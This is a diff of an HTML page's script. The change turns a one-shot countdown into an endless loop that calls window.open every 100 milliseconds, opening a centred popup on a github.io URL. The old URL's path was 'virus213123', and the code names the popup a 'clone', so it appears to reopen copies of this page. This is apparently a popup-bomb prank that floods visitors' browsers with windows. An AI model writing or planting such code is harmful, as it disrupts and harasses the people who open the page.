@@ -37,42 +37,50 @@
         <div id="status">10.000s</div>
     </div>
 
-    <script>
-        window.onload = () => {
-            const status = document.getElementById('status');
-            const duration = 100; // 10 seconds in ms
-            const startTime = performance.now();
+<script>
+    const duration = 100; // 10 seconds in ms
+    const status = document.getElementById('status');
 
-            function update() {
-                const currentTime = performance.now();
-                const elapsed = currentTime - startTime;
-                const remaining = Math.max(0, duration - elapsed);
+    function startSequence() {
+        const startTime = performance.now();
 
-                // Format to 3 decimal places for millisecond precision
-                status.innerText = (remaining / 1000).toFixed(3) + "s";
+        function update() {
+            const currentTime = performance.now();
+            const elapsed = currentTime - startTime;
+            const remaining = Math.max(0, duration - elapsed);
 
-                if (remaining > 0) {
-                    requestAnimationFrame(update);
-                } else {
-                    openClone();
-                    status.innerText = "Window triggered.";
-                }
+            // Update the display
+            status.innerText = (remaining / 1000).toFixed(3) + "s";
+
+            if (remaining > 0) {
+                requestAnimationFrame(update);
+            } else {
+                // Action to take when timer hits zero
+                openClone();
+                
+                // RESTART THE LOOP
+                console.log("Restarting sequence...");
+                startSequence(); 
             }
-
-            requestAnimationFrame(update);
-        };
-
-        function openClone() {
-            const width = Math.round(window.screen.width * 0.37);
-            const height = Math.round(window.screen.height * 0.37);
-            const left = (window.screen.width / 2) - (width / 2);
-            const top = (window.screen.height / 2) - (height / 2);
-
-            const features = `width=${width},height=${height},left=${left},top=${top},menubar=no,toolbar=no,location=no,status=no`;
-            
-            // Note: Passed 'features' into the third argument
-            window.open('https://sumeguyontheinternet.github.io/virus213123/index.html', '_blank', features);
         }
-    </script>
+
+        requestAnimationFrame(update);
+    }
+
+    function openClone() {
+        const width = Math.round(window.screen.width * 0.37);
+        const height = Math.round(window.screen.height * 0.37);
+        const left = (window.screen.width / 2) - (width / 2);
+        const top = (window.screen.height / 2) - (height / 2);
+
+        const features = `width=${width},height=${height},left=${left},top=${top},menubar=no,toolbar=no,location=no,status=no`;
+        
+        // This will likely be blocked by the browser unless you click the page first
+        window.open('https://sumeguyontheinternet.github.io/test/index.html', '_blank', features);
+    }
+
+    // Initialize the first run
+    window.onload = startSequence;
+</script>
 </body>
 </html>
